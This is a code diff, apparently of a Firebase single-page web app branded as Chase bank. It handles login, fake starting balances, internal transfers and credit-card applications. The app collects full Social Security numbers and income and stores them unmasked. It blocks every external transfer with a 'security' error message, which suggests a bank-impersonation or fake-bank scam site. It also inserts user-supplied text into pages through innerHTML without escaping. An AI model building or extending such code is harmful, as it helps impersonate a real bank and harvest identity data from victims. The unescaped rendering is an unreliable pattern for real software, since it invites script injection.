+                    checkingAccount: checkingAccount,
+                    savingsAccount: savingsAccount,
                     checkingBalance: 1000.00,
                     savingsBalance: 500.00,
                     createdAt: firebase.firestore.FieldValue.serverTimestamp()
                 });
+
                 showToast('Account created successfully!');
             } catch (error) {
                 showAuthError(error.message);
@@ -747,22 +1929,28 @@
             }
         }
 
-        // Handle Login (Keep as is)
+        // Handle Login
         async function handleLogin() {
             const email = document.getElementById('loginEmail').value;
             const password = document.getElementById('loginPassword').value;
             const rememberMe = document.getElementById('rememberMe').checked;
+
             if (!email || !password) {
                 showAuthError('Please enter email and password');
                 return;
             }
+
             const btn = document.getElementById('loginBtn');
             const btnText = document.getElementById('loginBtnText');
             btn.disabled = true;
             btnText.innerHTML = '<span class="spinner"></span> Signing in...';
+
             try {
-                const persistence = rememberMe ? firebase.auth.Auth.Persistence.LOCAL : firebase.auth.Auth.Persistence.SESSION;
+                const persistence = rememberMe ? 
+                    firebase.auth.Auth.Persistence.LOCAL : 
+                    firebase.auth.Auth.Persistence.SESSION;
                 await auth.setPersistence(persistence);
+                
                 await auth.signInWithEmailAndPassword(email, password);
             } catch (error) {
                 showAuthError(error.message);
@@ -771,7 +1959,7 @@
             }
         }
 
-        // Logout (Keep as is)
+        // Logout
         async function logout() {
             try {
                 await auth.signOut();
@@ -781,24 +1969,42 @@
             }
         }
 
-        // Load user data from Firestore (Keep as is)
+        // Load user data from Firestore
         async function loadUserData(uid) {
             try {
                 const doc = await db.collection('users').doc(uid).get();
                 if (doc.exists) {
                     userData = doc.data();
+                    
+                    // Update UI with user data
                     document.getElementById('userName').textContent = userData.fullName.split(' ')[0];
                     document.getElementById('profileInitial').textContent = userData.fullName.charAt(0);
-                    document.getElementById('checkingBalance').textContent = `$${userData.checkingBalance.toFixed(2)}`;
-                    document.getElementById('savingsBalance').textContent = `$${userData.savingsBalance.toFixed(2)}`;
+                    
+                    // Update account displays
+                    document.getElementById('checkingBalance').textContent = 
+                        `$${userData.checkingBalance.toFixed(2)}`;
+                    document.getElementById('savingsBalance').textContent = 
+                        `$${userData.savingsBalance.toFixed(2)}`;
+                    
                     const total = userData.checkingBalance + userData.savingsBalance;
-                    document.getElementById('totalBalance').textContent = `$${total.toLocaleString('en-US', {minimumFractionDigits: 2})}`;
-                    document.getElementById('accountNumber').textContent = `Account: ${userData.checkingAccount.slice(0,4)}-${userData.checkingAccount.slice(-4)}`;
-                    document.getElementById('checkingAccountNumber').textContent = `** ${userData.checkingAccount.slice(-4)}`;
-                    document.getElementById('savingsAccountNumber').textContent = `** ${userData.savingsAccount.slice(-4)}`;
+                    document.getElementById('totalBalance').textContent = 
+                        `$${total.toLocaleString('en-US', {minimumFractionDigits: 2})}`;
+                    
+                    document.getElementById('accountNumber').textContent = 
+                        `Account: ${userData.checkingAccount.slice(0,4)}-${userData.checkingAccount.slice(-4)}`;
+                    
+                    document.getElementById('checkingAccountNumber').textContent = 
+                        `** ${userData.checkingAccount.slice(-4)}`;
+                    document.getElementById('savingsAccountNumber').textContent = 
+                        `** ${userData.savingsAccount.slice(-4)}`;
 
+                    // Load notifications
                     await loadNotifications(uid);
+                    
+                    // Load transactions
                     await loadTransactions(uid);
+                    
+                    // Load card applications
                     await loadCardApplications(uid);
                 }
             } catch (error) {
@@ -806,7 +2012,7 @@
             }
         }
 
-        // Load notifications (Keep as is)
+        // Load notifications
         async function loadNotifications(uid) {
             try {
                 const snapshot = await db.collection('notifications')
@@ -814,13 +2020,17 @@
                     .orderBy('timestamp', 'desc')
                     .limit(20)
                     .get();
+
                 notifications = [];
                 unreadCount = 0;
+
                 snapshot.forEach(doc => {
                     const notif = { id: doc.id, ...doc.data() };
                     notifications.push(notif);
                     if (!notif.read) unreadCount++;
                 });
+
+                // Update badge
                 const badge = document.getElementById('notificationBadge');
                 if (unreadCount > 0) {
                     badge.textContent = unreadCount;
@@ -828,13 +2038,14 @@
                 } else {
                     badge.classList.add('hidden');
                 }
+
                 renderNotifications();
             } catch (error) {
                 console.error('Error loading notifications:', error);
             }
         }
 
-        // Load transactions (Keep as is)
+        // Load transactions
         async function loadTransactions(uid) {
             try {
                 const snapshot = await db.collection('transactions')
@@ -842,39 +2053,52 @@
                     .orderBy('timestamp', 'desc')
                     .limit(50)
                     .get();
+
                 const transactions = [];
-                snapshot.forEach(doc => transactions.push({ id: doc.id, ...doc.data() }));
+                snapshot.forEach(doc => {
+                    transactions.push({ id: doc.id, ...doc.data() });
+                });
+
                 renderTransactions(transactions);
             } catch (error) {
                 console.error('Error loading transactions:', error);
             }
         }
 
-        // Load card applications (Keep as is)
+        // Load card applications
         async function loadCardApplications(uid) {
             try {
                 const snapshot = await db.collection('cardApplications')
                     .where('userId', '==', uid)
                     .orderBy('timestamp', 'desc')
                     .get();
+
                 cardApplications = [];
-                snapshot.forEach(doc => cardApplications.push({ id: doc.id, ...doc.data() }));
+                snapshot.forEach(doc => {
+                    cardApplications.push({ id: doc.id, ...doc.data() });
+                });
+
                 if (cardApplications.length > 0) {
                     document.getElementById('noCardsState').classList.add('hidden');
                     document.getElementById('applicationsList').classList.remove('hidden');
+                    
                     document.getElementById('applicationsList').innerHTML = `
                         <h4 style="margin-bottom: 15px; color: var(--text-gray); font-size: 14px;">Applications</h4>
-                        ${cardApplications.map(app => `
-                            <div class="application-status">
-                                <div style="display: flex; justify-content: space-between; align-items: center;">
-                                    <div>
-                                        <div style="font-weight: 600; margin-bottom: 4px;">${app.cardName}</div>
-                                        <div style="font-size: 13px; color: var(--text-gray);">Applied ${new Date(app.timestamp?.toDate()).toLocaleDateString()}</div>
+                        ${cardApplications.map(app => {
+                            const date = app.timestamp ? new Date(app.timestamp.toDate()) : new Date();
+                            const formattedDate = `${(date.getMonth()+1).toString().padStart(2,'0')}/${date.getDate().toString().padStart(2,'0')}/${date.getFullYear()}`;
+                            return `
+                                <div class="application-status">
+                                    <div style="display: flex; justify-content: space-between; align-items: center;">
+                                        <div>
+                                            <div style="font-weight: 600; margin-bottom: 4px;">${app.cardName}</div>
+                                            <div style="font-size: 13px; color: var(--text-gray);">Applied ${formattedDate}</div>
+                                        </div>
+                                        <span class="status-badge under-review">${app.status}</span>
                                     </div>
-                                    <span class="status-badge under-review">${app.status}</span>
                                 </div>
-                            </div>
-                        `).join('')}
+                            `;
+                        }).join('')}
                     `;
                 }
             } catch (error) {
@@ -882,19 +2106,29 @@
             }
         }
 
-        // Lookup recipient (Keep as is)
+        // Lookup recipient
         async function lookupRecipient() {
             const accountNumber = document.getElementById('toAccount').value.trim();
             const recipientDiv = document.getElementById('recipientInfo');
+
             if (!accountNumber || accountNumber.length < 8) {
                 recipientDiv.classList.add('hidden');
                 return;
             }
+
             try {
-                const checkingQuery = await db.collection('users').where('checkingAccount', '==', accountNumber).get();
-                const savingsQuery = await db.collection('users').where('savingsAccount', '==', accountNumber).get();
+                // Search for user with this account number
+                const checkingQuery = await db.collection('users')
+                    .where('checkingAccount', '==', accountNumber)
+                    .get();
+
+                const savingsQuery = await db.collection('users')
+                    .where('savingsAccount', '==', accountNumber)
+                    .get();
+
                 let recipient = null;
                 let accountType = '';
+
                 if (!checkingQuery.empty) {
                     recipient = checkingQuery.docs[0].data();
                     accountType = 'Checking';
@@ -902,6 +2136,7 @@
                     recipient = savingsQuery.docs[0].data();
                     accountType = 'Savings';
                 }
+
                 if (recipient) {
                     recipientDiv.innerHTML = `
                         <div class="recipient-info">
@@ -930,62 +2165,142 @@
             }
         }
 
-        // Show success modal (Keep as is)
+        // Show success modal
         function showSuccessModal(amount, recipientName, fromAccount, newBalance, description) {
             const modalContent = document.getElementById('successModalContent');
             const date = new Date();
-            const formattedDate = date.toLocaleDateString('en-US', { month: 'long', day: 'numeric', year: 'numeric' });
-            const formattedTime = date.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit' });
+            const formattedDate = date.toLocaleDateString('en-US', { 
+                month: 'long', 
+                day: 'numeric', 
+                year: 'numeric' 
+            });
+            const formattedTime = date.toLocaleTimeString('en-US', { 
+                hour: '2-digit', 
+                minute: '2-digit' 
+            });
+
             modalContent.innerHTML = `
-                <div class="success-checkmark"><i class="fas fa-check"></i></div>
+                <div class="success-checkmark">
+                    <i class="fas fa-check"></i>
+                </div>
                 <h2 class="success-title">Transfer Successful!</h2>
                 <div class="success-amount">$${amount.toFixed(2)}</div>
                 <div class="success-recipient">to ${recipientName}</div>
+                
                 <div class="success-details">
-                    <div class="success-detail-item"><span class="success-detail-label">From Account</span><span class="success-detail-value">${fromAccount === 'checking' ? 'Checking' : 'Savings'}</span></div>
-                    <div class="success-detail-item"><span class="success-detail-label">Date</span><span class="success-detail-value">${formattedDate}</span></div>
-                    <div class="success-detail-item"><span class="success-detail-label">Time</span><span class="success-detail-value">${formattedTime}</span></div>
-                    <div class="success-detail-item"><span class="success-detail-label">Transaction ID</span><span class="success-detail-value">#${Math.random().toString(36).substring(2, 10).toUpperCase()}</span></div>
-                    ${description ? `<div class="success-detail-item"><span class="success-detail-label">Description</span><span class="success-detail-value">${description}</span></div>` : ''}
+                    <div class="success-detail-item">
+                        <span class="success-detail-label">From Account</span>
+                        <span class="success-detail-value">${fromAccount === 'checking' ? 'Checking' : 'Savings'}</span>
+                    </div>
+                    <div class="success-detail-item">
+                        <span class="success-detail-label">Date</span>
+                        <span class="success-detail-value">${formattedDate}</span>
+                    </div>
+                    <div class="success-detail-item">
+                        <span class="success-detail-label">Time</span>
+                        <span class="success-detail-value">${formattedTime}</span>
+                    </div>
+                    <div class="success-detail-item">
+                        <span class="success-detail-label">Transaction ID</span>
+                        <span class="success-detail-value">#${Math.random().toString(36).substring(2, 10).toUpperCase()}</span>
+                    </div>
+                    ${description ? `
+                    <div class="success-detail-item">
+                        <span class="success-detail-label">Description</span>
+                        <span class="success-detail-value">${description}</span>
+                    </div>
+                    ` : ''}
                 </div>
-                <div class="success-balance">New ${fromAccount === 'checking' ? 'Checking' : 'Savings'} Balance: <span>$${newBalance.toFixed(2)}</span></div>
-                <button class="btn-success" onclick="closeModal('successModal')">Done</button>
+                
+                <div class="success-balance">
+                    New ${fromAccount === 'checking' ? 'Checking' : 'Savings'} Balance: <span>$${newBalance.toFixed(2)}</span>
+                </div>
+                
+                <button class="btn-success" onclick="closeModal('successModal')">
+                    Done
+                </button>
             `;
+
             document.getElementById('successModal').classList.add('active');
         }
 
-        // FIXED: Process transfer with better error logging
+        // Process transfer - FIXED VERSION
         async function processTransfer() {
             const fromAccount = document.getElementById('fromAccount').value;
             const toAccount = document.getElementById('toAccount').value.trim();
             const amount = parseFloat(document.getElementById('transferAmount').value);
             const description = document.getElementById('transferDesc').value || 'Transfer';
 
-            if (!fromAccount) { showToast('Please select an account to transfer from'); return; }
-            if (!toAccount) { showToast('Please enter recipient account number'); return; }
-            if (!amount || amount <= 0) { showToast('Please enter a valid amount'); return; }
+            // Validation
+            if (!fromAccount) {
+                showToast('Please select an account to transfer from');
+                return;
+            }
+
+            if (!toAccount) {
+                showToast('Please enter recipient account number');
+                return;
+            }
+
+            if (!amount || amount <= 0) {
+                showToast('Please enter a valid amount');
+                return;
+            }
+
+            if (!userData) {
+                showToast('User data not loaded. Please refresh.');
+                return;
+            }
+
+            // Check sufficient funds
+            const currentBalance = fromAccount === 'checking' ? userData.checkingBalance : userData.savingsBalance;
+            if (currentBalance < amount) {
+                showToast('Insufficient funds');
+                return;
+            }
 
             const btn = document.getElementById('transferBtn');
             const btnText = document.getElementById('transferBtnText');
+            
             btn.disabled = true;
             btnText.innerHTML = '<span class="spinner"></span> Processing...';
 
             try {
-                console.log('🔍 Looking up recipient:', toAccount);
-                const checkingQuery = await db.collection('users').where('checkingAccount', '==', toAccount).get();
-                const savingsQuery = await db.collection('users').where('savingsAccount', '==', toAccount).get();
+                console.log('Looking up recipient:', toAccount);
+                
+                // Search for user with this account number
+                const checkingQuery = await db.collection('users')
+                    .where('checkingAccount', '==', toAccount)
+                    .get();
+
+                const savingsQuery = await db.collection('users')
+                    .where('savingsAccount', '==', toAccount)
+                    .get();
+
                 const isInternal = !checkingQuery.empty || !savingsQuery.empty;
 
                 if (!isInternal) {
+                    // Show external transfer error
                     document.getElementById('errorCode').textContent = 'ERROR: EXT-TRF-001';
                     document.getElementById('errorTitle').textContent = 'External Transfer Restricted';
-                    document.getElementById('errorMessage').innerHTML = `Dear ${userData.fullName},<br><br>For your security, transfers to external accounts are temporarily restricted. Please use internal transfers between Chase accounts only.`;
+                    document.getElementById('errorMessage').innerHTML = 
+                        `Dear ${userData.fullName},<br><br>` +
+                        `For your security, transfers to external accounts are temporarily restricted. ` +
+                        `Please use internal transfers between Chase accounts only.`;
                     closeModal('transferModal');
-                    setTimeout(() => document.getElementById('errorModal').classList.add('active'), 300);
+                    setTimeout(() => {
+                        document.getElementById('errorModal').classList.add('active');
+                    }, 300);
+                    btn.disabled = false;
+                    btnText.textContent = 'Send Money';
                     return;
                 }
 
-                let recipientDoc, recipientData, recipientAccountType;
+                // Find recipient
+                let recipientDoc = null;
+                let recipientData = null;
+                let recipientAccountType = '';
+
                 if (!checkingQuery.empty) {
                     recipientDoc = checkingQuery.docs[0];
                     recipientData = recipientDoc.data();
@@ -996,71 +2311,115 @@
                     recipientAccountType = 'savings';
                 }
 
+                // Check if sending to self
                 if (recipientDoc.id === currentUser.uid) {
                     showToast('Cannot transfer to your own account');
+                    btn.disabled = false;
+                    btnText.textContent = 'Send Money';
                     return;
                 }
 
-                const currentBalance = fromAccount === 'checking' ? userData.checkingBalance : userData.savingsBalance;
-                if (currentBalance < amount) {
-                    showToast('Insufficient funds');
-                    return;
-                }
+                console.log('Processing transfer to:', recipientData.fullName);
 
-                console.log('✅ Recipient found:', recipientData.fullName);
-
+                // Start batch write
                 const batch = db.batch();
-                const senderRef = db.collection('users').doc(currentUser.uid);
-                const newSenderBalance = fromAccount === 'checking' ? userData.checkingBalance - amount : userData.savingsBalance - amount;
-                batch.update(senderRef, { [`${fromAccount}Balance`]: newSenderBalance });
 
+                // Deduct from sender
+                const senderRef = db.collection('users').doc(currentUser.uid);
+                const newSenderBalance = fromAccount === 'checking' 
+                    ? userData.checkingBalance - amount
+                    : userData.savingsBalance - amount;
+
+                batch.update(senderRef, {
+                    [`${fromAccount}Balance`]: newSenderBalance
+                });
+
+                // Add to recipient
                 const recipientBalanceField = `${recipientAccountType}Balance`;
                 const newRecipientBalance = (recipientData[recipientBalanceField] || 0) + amount;
-                batch.update(recipientDoc.ref, { [recipientBalanceField]: newRecipientBalance });
 
+                batch.update(recipientDoc.ref, {
+                    [recipientBalanceField]: newRecipientBalance
+                });
+
+                // Create transaction record for sender
                 const senderTransaction = {
-                    userId: currentUser.uid, type: 'debit', name: `Transfer to ${recipientData.fullName}`,
-                    amount: -amount, balance: newSenderBalance, description, timestamp: firebase.firestore.FieldValue.serverTimestamp()
+                    userId: currentUser.uid,
+                    type: 'debit',
+                    name: `Transfer to ${recipientData.fullName}`,
+                    amount: -amount,
+                    balance: newSenderBalance,
+                    description: description,
+                    timestamp: firebase.firestore.FieldValue.serverTimestamp()
                 };
-                batch.set(db.collection('transactions').doc(), senderTransaction);
+                
+                const senderTransRef = db.collection('transactions').doc();
+                batch.set(senderTransRef, senderTransaction);
 
+                // Create transaction record for recipient
                 const recipientTransaction = {
-                    userId: recipientDoc.id, type: 'credit', name: `Transfer from ${userData.fullName}`,
-                    amount, balance: newRecipientBalance, description, timestamp: firebase.firestore.FieldValue.serverTimestamp()
+                    userId: recipientDoc.id,
+                    type: 'credit',
+                    name: `Transfer from ${userData.fullName}`,
+                    amount: amount,
+                    balance: newRecipientBalance,
+                    description: description,
+                    timestamp: firebase.firestore.FieldValue.serverTimestamp()
                 };
-                batch.set(db.collection('transactions').doc(), recipientTransaction);
+                
+                const recipientTransRef = db.collection('transactions').doc();
+                batch.set(recipientTransRef, recipientTransaction);
 
+                // Create notification for recipient
                 const notification = {
-                    userId: recipientDoc.id, title: 'Money Received',
+                    userId: recipientDoc.id,
+                    title: 'Money Received',
                     message: `You received $${amount.toFixed(2)} from ${userData.fullName}`,
-                    read: false, timestamp: firebase.firestore.FieldValue.serverTimestamp()
+                    read: false,
+                    timestamp: firebase.firestore.FieldValue.serverTimestamp()
                 };
-                batch.set(db.collection('notifications').doc(), notification);
+                
+                const notifRef = db.collection('notifications').doc();
+                batch.set(notifRef, notification);
 
+                // Commit all changes
                 await batch.commit();
-                console.log('✅ Batch committed successfully');
+                console.log('Transfer completed successfully');
 
+                // Update local data
                 if (fromAccount === 'checking') {
                     userData.checkingBalance = newSenderBalance;
                 } else {
                     userData.savingsBalance = newSenderBalance;
                 }
 
-                document.getElementById('checkingBalance').textContent = `$${userData.checkingBalance.toFixed(2)}`;
-                document.getElementById('savingsBalance').textContent = `$${userData.savingsBalance.toFixed(2)}`;
+                // Update UI
+                document.getElementById('checkingBalance').textContent = 
+                    `$${userData.checkingBalance.toFixed(2)}`;
+                document.getElementById('savingsBalance').textContent = 
+                    `$${userData.savingsBalance.toFixed(2)}`;
+                
                 const total = userData.checkingBalance + userData.savingsBalance;
-                document.getElementById('totalBalance').textContent = `$${total.toLocaleString('en-US', { minimumFractionDigits: 2 })}`;
+                document.getElementById('totalBalance').textContent = 
+                    `$${total.toLocaleString('en-US', {minimumFractionDigits: 2})}`;
 
                 closeModal('transferModal');
+                
+                // Show beautiful success modal
                 showSuccessModal(amount, recipientData.fullName, fromAccount, newSenderBalance, description);
+
+                // Reload transactions
                 await loadTransactions(currentUser.uid);
 
             } catch (error) {
-                console.error('❌ Transfer error:', error);
+                console.error('Transfer error:', error);
                 console.error('Error code:', error.code);
                 console.error('Error message:', error.message);
+                
                 if (error.code === 'permission-denied') {
                     showToast('Permission denied. Please check Firebase rules.');
+                } else if (error.code === 'not-found') {
+                    showToast('Recipient account not found');
                 } else {
                     showToast('Transfer failed: ' + error.message);
                 }
@@ -1070,67 +2429,133 @@
             }
         }
 
-        // Submit card application (Keep as is)
+        // Submit card application - FIXED VERSION
         async function submitCardApplication() {
             const ssn = document.getElementById('ssnInput').value;
             const income = document.getElementById('incomeInput').value;
             const employment = document.getElementById('employmentStatus').value;
-            if (!ssn || ssn.length !== 9) { showToast('Please enter a valid 9-digit SSN'); return; }
-            if (!income) { showToast('Please enter your annual income'); return; }
-            if (!employment) { showToast('Please select employment status'); return; }
-            const cardNames = { 'preferred': 'Chase Sapphire Preferred®', 'reserve': 'Chase Sapphire Reserve®', 'freedom-unlimited': 'Chase Freedom Unlimited®', 'freedom-flex': 'Chase Freedom Flex℠' };
+
+            // Validation
+            if (!ssn || ssn.length !== 9) {
+                showToast('Please enter a valid 9-digit SSN');
+                return;
+            }
+
+            if (!income) {
+                showToast('Please enter your annual income');
+                return;
+            }
+
+            if (!employment) {
+                showToast('Please select employment status');
+                return;
+            }
+
+            const cardNames = {
+                'preferred': 'Chase Sapphire Preferred®',
+                'reserve': 'Chase Sapphire Reserve®',
+                'freedom-unlimited': 'Chase Freedom Unlimited®',
+                'freedom-flex': 'Chase Freedom Flex℠'
+            };
+
             const btn = event.currentTarget;
             const originalText = btn.textContent;
             btn.disabled = true;
             btn.innerHTML = '<span class="spinner"></span> Submitting...';
+
             try {
-                const application = { userId: currentUser.uid, cardType: selectedCard, cardName: cardNames[selectedCard], ssn, annualIncome: parseFloat(income), employmentStatus: employment, status: 'Under Review', timestamp: firebase.firestore.FieldValue.serverTimestamp() };
+                const application = {
+                    userId: currentUser.uid,
+                    cardType: selectedCard,
+                    cardName: cardNames[selectedCard],
+                    ssn: ssn,
+                    annualIncome: parseFloat(income),
+                    employmentStatus: employment,
+                    status: 'Under Review',
+                    timestamp: firebase.firestore.FieldValue.serverTimestamp()
+                };
+
+                // Save to Firebase
                 await db.collection('cardApplications').add(application);
+                
                 closeModal('cardModal');
                 showToast('Application submitted successfully!');
+                
+                // Reload card applications
                 await loadCardApplications(currentUser.uid);
+                
+                // Switch to cards tab
                 switchTab('cards', { currentTarget: document.querySelectorAll('.nav-item')[3] });
+                
             } catch (error) {
                 console.error('Error submitting application:', error);
-                showToast('Failed to submit application: ' + error.message);
+                console.error('Error code:', error.code);
+                console.error('Error message:', error.message);
+                
+                if (error.code === 'permission-denied') {
+                    showToast('Permission denied. Please check Firebase rules.');
+                } else {
+                    showToast('Failed to submit application: ' + error.message);
+                }
             } finally {
                 btn.disabled = false;
                 btn.innerHTML = originalText;
             }
         }
 
-        // Navigation (Keep as is)
+        // Navigation
         function switchTab(tab, event) {
             document.querySelectorAll('.nav-item').forEach(item => item.classList.remove('active'));
             event.currentTarget.classList.add('active');
+            
             document.getElementById('accountsView').classList.add('hidden');
             document.getElementById('transactionsView').classList.add('hidden');
             document.getElementById('notificationsView').classList.add('hidden');
             document.getElementById('cardsView').classList.add('hidden');
             document.getElementById('payView').classList.add('hidden');
-            if (tab === 'accounts') document.getElementById('accountsView').classList.remove('hidden');
-            else if (tab === 'transactions') { document.getElementById('transactionsView').classList.remove('hidden'); viewTransactions('checking'); }
-            else if (tab === 'notifications') document.getElementById('notificationsView').classList.remove('hidden');
-            else if (tab === 'cards') document.getElementById('cardsView').classList.remove('hidden');
-            else if (tab === 'pay') document.getElementById('payView').classList.remove('hidden');
+            
+            if (tab === 'accounts') {
+                document.getElementById('accountsView').classList.remove('hidden');
+            } else if (tab === 'transactions') {
+                document.getElementById('transactionsView').classList.remove('hidden');
+                viewTransactions('checking');
+            } else if (tab === 'notifications') {
+                document.getElementById('notificationsView').classList.remove('hidden');
+            } else if (tab === 'cards') {
+                document.getElementById('cardsView').classList.remove('hidden');
+            } else if (tab === 'pay') {
+                document.getElementById('payView').classList.remove('hidden');
+            }
         }
 
-        // View transactions for specific account (Keep as is)
+        // View transactions for specific account
         function viewTransactions(accountType) {
             document.getElementById('accountsView').classList.add('hidden');
             document.getElementById('transactionsView').classList.remove('hidden');
+            
             document.querySelectorAll('.nav-item').forEach(item => item.classList.remove('active'));
             document.querySelectorAll('.nav-item')[2].classList.add('active');
-            document.getElementById('transAccountName').textContent = accountType === 'checking' ? 'TOTAL CHECKING' : 'CHASE SAVINGS';
-            document.getElementById('transAccountNumber').textContent = `** ${(accountType === 'checking' ? userData.checkingAccount : userData.savingsAccount).slice(-4)}`;
-            document.getElementById('transBalance').textContent = `$${(accountType === 'checking' ? userData.checkingBalance : userData.savingsBalance).toFixed(2)}`;
+            
+            document.getElementById('transAccountName').textContent = 
+                accountType === 'checking' ? 'TOTAL CHECKING' : 'CHASE SAVINGS';
+            document.getElementById('transAccountNumber').textContent = 
+                `** ${(accountType === 'checking' ? userData.checkingAccount : userData.savingsAccount).slice(-4)}`;
+            document.getElementById('transBalance').textContent = 
+                `$${(accountType === 'checking' ? userData.checkingBalance : userData.savingsBalance).toFixed(2)}`;
         }
 
-        // Render transactions (Keep as is)
+        // Render transactions
         function renderTransactions(transactions) {
             const list = document.getElementById('transactionsList');
-            if (transactions.length === 0) { list.innerHTML = '<p style="text-align: center; color: var(--text-gray); padding: 20px;">No transactions yet</p>'; return; }
-            list.innerHTML = transactions.map(t => { const date = t.timestamp ? new Date(t.timestamp.toDate()) : new Date(); return `
+            
+            if (transactions.length === 0) {
+                list.innerHTML = '<p style="text-align: center; color: var(--text-gray); padding: 20px;">No transactions yet</p>';
+                return;
+            }
+
+            list.innerHTML = transactions.map(t => {
+                const date = t.timestamp ? new Date(t.timestamp.toDate()) : new Date();
+                return `
                 <div class="transaction-item">
                     <div class="transaction-info">
                         <div class="transaction-name">${t.name}</div>
@@ -1142,86 +2567,194 @@
                         <div class="transaction-balance">$${t.balance.toFixed(2)}</div>
                     </div>
                 </div>
-            ` }).join('');
+            `}).join('');
         }
 
-        // Render notifications (Keep as is)
+        // Render notifications
         function renderNotifications() {
             const list = document.getElementById('notificationsList');
-            if (notifications.length === 0) { list.innerHTML = '<p style="text-align: center; color: var(--text-gray); padding: 20px;">No notifications</p>'; return; }
-            list.innerHTML = notifications.map(n => { const date = n.timestamp ? new Date(n.timestamp.toDate()) : new Date(); return `
+            
+            if (notifications.length === 0) {
+                list.innerHTML = '<p style="text-align: center; color: var(--text-gray); padding: 20px;">No notifications</p>';
+                return;
+            }
+
+            list.innerHTML = notifications.map(n => {
+                const date = n.timestamp ? new Date(n.timestamp.toDate()) : new Date();
+                return `
                 <div class="notification-item">
                     <div class="notification-title">${n.title}</div>
                     <div class="notification-desc">${n.message}</div>
                     <div class="notification-time">${date.toLocaleString()}</div>
                 </div>
-            ` }).join('');
+            `}).join('');
         }
 
-        // Open notifications and mark as read (Keep as is)
+        // Open notifications and mark as read
         async function openNotifications() {
             switchTab('notifications', { currentTarget: document.querySelectorAll('.nav-item')[2] });
+            
+            // Mark notifications as read
             const batch = db.batch();
-            notifications.forEach(n => { if (!n.read) { const notifRef = db.collection('notifications').doc(n.id); batch.update(notifRef, { read: true }); } });
+            notifications.forEach(n => {
+                if (!n.read) {
+                    const notifRef = db.collection('notifications').doc(n.id);
+                    batch.update(notifRef, { read: true });
+                }
+            });
             await batch.commit();
+            
             unreadCount = 0;
             document.getElementById('notificationBadge').classList.add('hidden');
         }
 
-        // Open profile modal (Keep as is)
+        // Open profile modal
         function openProfileModal() {
             const profileDiv = document.getElementById('profileInfo');
             const joinDate = userData.createdAt ? new Date(userData.createdAt.toDate()) : new Date();
+            
             profileDiv.innerHTML = `
                 <div class="profile-avatar">${userData.fullName.charAt(0)}</div>
-                <div class="profile-detail"><div class="profile-label">Full Name</div><div class="profile-value">${userData.fullName}</div></div>
-                <div class="profile-detail"><div class="profile-label">Email</div><div class="profile-value">${userData.email}</div></div>
-                <div class="profile-detail"><div class="profile-label">Phone</div><div class="profile-value">${userData.phone}</div></div>
-                <div class="profile-detail"><div class="profile-label">Address</div><div class="profile-value">${userData.address}</div></div>
-                <div class="profile-detail"><div class="profile-label">Checking Account</div><div class="profile-value">${userData.checkingAccount}</div></div>
-                <div class="profile-detail"><div class="profile-label">Savings Account</div><div class="profile-value">${userData.savingsAccount}</div></div>
-                <div class="profile-detail"><div class="profile-label">Member Since</div><div class="profile-value">${joinDate.toLocaleDateString()}</div></div>
+                <div class="profile-detail">
+                    <div class="profile-label">Full Name</div>
+                    <div class="profile-value">${userData.fullName}</div>
+                </div>
+                <div class="profile-detail">
+                    <div class="profile-label">Email</div>
+                    <div class="profile-value">${userData.email}</div>
+                </div>
+                <div class="profile-detail">
+                    <div class="profile-label">Phone</div>
+                    <div class="profile-value">${userData.phone}</div>
+                </div>
+                <div class="profile-detail">
+                    <div class="profile-label">Address</div>
+                    <div class="profile-value">${userData.address}</div>
+                </div>
+                <div class="profile-detail">
+                    <div class="profile-label">Checking Account</div>
+                    <div class="profile-value">${userData.checkingAccount}</div>
+                </div>
+                <div class="profile-detail">
+                    <div class="profile-label">Savings Account</div>
+                    <div class="profile-value">${userData.savingsAccount}</div>
+                </div>
+                <div class="profile-detail">
+                    <div class="profile-label">Member Since</div>
+                    <div class="profile-value">${joinDate.toLocaleDateString()}</div>
+                </div>
                 <button class="btn-primary" onclick="closeModal('profileModal')" style="margin-top: 20px;">Close</button>
             `;
             document.getElementById('profileModal').classList.add('active');
         }
 
-        // Transfer functions (Keep as is)
-        function openTransferModal() { document.getElementById('transferModal').classList.add('active'); }
-        function openCardApplication() { document.getElementById('cardModal').classList.add('active'); goToCardStep1(); }
-        function goToCardStep1() { document.getElementById('cardStep1').classList.remove('hidden'); document.getElementById('cardStep2').classList.add('hidden'); document.getElementById('cardStep3').classList.add('hidden'); document.getElementById('cardModalTitle').textContent = 'Credit Card Application'; }
-        function goToCardStep2() { document.getElementById('cardStep1').classList.add('hidden'); document.getElementById('cardStep2').classList.remove('hidden'); document.getElementById('cardStep3').classList.add('hidden'); }
+        // Transfer functions
+        function openTransferModal() {
+            document.getElementById('transferModal').classList.add('active');
+        }
+
+        function openCardApplication() {
+            document.getElementById('cardModal').classList.add('active');
+            goToCardStep1();
+        }
+
+        function goToCardStep1() {
+            document.getElementById('cardStep1').classList.remove('hidden');
+            document.getElementById('cardStep2').classList.add('hidden');
+            document.getElementById('cardStep3').classList.add('hidden');
+            document.getElementById('cardModalTitle').textContent = 'Credit Card Application';
+        }
+
+        function goToCardStep2() {
+            document.getElementById('cardStep1').classList.add('hidden');
+            document.getElementById('cardStep2').classList.remove('hidden');
+            document.getElementById('cardStep3').classList.add('hidden');
+        }
+
         function goToCardStep3() {
             const ssn = document.getElementById('ssnInput').value;
-            if (ssn.length !== 9) { showToast('Please enter a valid 9-digit SSN'); return; }
-            const cardNames = { 'preferred': 'Chase Sapphire Preferred®', 'reserve': 'Chase Sapphire Reserve®', 'freedom-unlimited': 'Chase Freedom Unlimited®', 'freedom-flex': 'Chase Freedom Flex℠' };
+            
+            if (ssn.length !== 9) {
+                showToast('Please enter a valid 9-digit SSN');
+                return;
+            }
+            
+            const cardNames = {
+                'preferred': 'Chase Sapphire Preferred®',
+                'reserve': 'Chase Sapphire Reserve®',
+                'freedom-unlimited': 'Chase Freedom Unlimited®',
+                'freedom-flex': 'Chase Freedom Flex℠'
+            };
+            
             document.getElementById('reviewCardType').textContent = cardNames[selectedCard];
             document.getElementById('reviewSSN').textContent = `***-**-${ssn.slice(-4)}`;
             document.getElementById('reviewIncome').textContent = `$${parseInt(document.getElementById('incomeInput').value || 0).toLocaleString()}`;
             document.getElementById('reviewEmployment').textContent = document.getElementById('employmentStatus').value || 'Not specified';
+            
             document.getElementById('cardStep2').classList.add('hidden');
             document.getElementById('cardStep3').classList.remove('hidden');
         }
-        function selectCard(card, fee) { selectedCard = card; document.querySelectorAll('.card-option').forEach(el => el.classList.remove('selected')); event.currentTarget.classList.add('selected'); }
-        function closeModal(modalId) { document.getElementById(modalId).classList.remove('active'); }
-        function updateAvailableBalance() { /* Optional */ }
 
